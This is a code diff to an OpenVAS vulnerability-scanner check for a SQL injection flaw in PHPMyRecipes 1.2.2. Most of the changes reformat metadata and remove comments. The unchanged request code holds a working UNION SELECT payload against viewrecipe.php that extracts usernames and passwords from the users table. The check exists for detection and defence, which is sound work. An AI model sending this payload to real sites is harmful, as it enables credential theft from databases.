@@ -27,16 +27,16 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.903204");
-  script_version("$Revision: 5791 $");
+  script_version("$Revision: 11103 $");
   script_bugtraq_id(58094);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-30 15:06:07 +0200 (Thu, 30 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 12:37:26 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-02-22 18:45:39 +0530 (Fri, 22 Feb 2013)");
   script_name("PHPMyRecipes SQL Injection Vulnerability");
-  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/82243");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24537");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120425/phpMyRecipes-1.2.2-SQL-Injection.html");
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/82243");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24537");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120425/phpMyRecipes-1.2.2-SQL-Injection.html");
 
   script_tag(name:"qod_type", value:"remote_app");
   script_tag(name:"solution_type", value:"WillNotFix");
@@ -48,18 +48,15 @@ if(description)
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "impact" , value : "Successful exploitation allow the attacker to compromise the
+  script_tag(name:"impact", value:"Successful exploitation allow the attacker to compromise the
   application, access or modify data in the back-end database.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "PHPMyRecipes version 1.2.2 and prior");
-  script_tag(name : "insight" , value : "Input passed via 'r_id' parameter in viewrecipe.php is not
+  script_tag(name:"affected", value:"PHPMyRecipes version 1.2.2 and prior");
+  script_tag(name:"insight", value:"Input passed via 'r_id' parameter in viewrecipe.php is not
   properly sanitised before being returned to the user.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "This host is installed with PHPMyRecipes and is prone to SQL
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is installed with PHPMyRecipes and is prone to SQL
   Injection Vulnerability.");
 
   exit(0);
@@ -67,12 +64,6 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-
-## Variable Initialization
-port = "";
-req = "";
-res = "";
-url = "";
 
 port = get_http_port(default:80);
 
@@ -87,16 +78,13 @@ foreach dir (make_list_unique("/", "/phpMyRecipes", "/recipes", cgi_dirs(port:po
 
   res = http_get_cache(item:string(dir,"/index.php"),  port:port);
 
-  ## Confirm the application
   if('>phpMyRecipes' >< res)
   {
-    ## Construct the Attack Request
     url = string(dir, "/recipes/viewrecipe.php?r_id=NULL/**/UNION/**/ALL/**",
                 "/SELECT/**/CONCAT(username,0x3a,password,0x4f70656e5641532d",
                 "53514c2d496e6a656374696f6e2d54657374)GORONTALO,NULL,NULL,",
                 "NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/users");
 
-    ## Try attack and Confirm the vulnerability
     if(http_vuln_check(port:port, url:url, pattern:"OpenVAS-SQL-Injection",
       "-Test", check_header:TRUE, extra_check:"findrecipe.php"))
     {
